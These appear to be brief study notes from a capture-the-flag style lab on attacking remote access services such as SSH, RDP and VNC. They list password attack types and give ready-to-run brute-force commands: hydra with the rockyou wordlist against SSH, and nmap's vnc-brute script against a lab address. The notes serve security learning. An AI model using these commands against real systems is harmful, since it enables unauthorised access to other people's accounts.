## Remote Access Services
- Remote administration : SSH , RDP, VNC


## Attacking Passwords
- Shouder Surfing
- Password Guessing
- Dictionary Attack
- Brute Force Attack

## Hacking an Authentication Service
- Example `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.74.48 ssh`


## Solution

### Brute pass 
- Bruteforcing password with `nmap vnc-brute script`
```bash
root@ip-10-10-111-252:~# nmap --script vnc-brute 10.10.69.18 -v -p5900
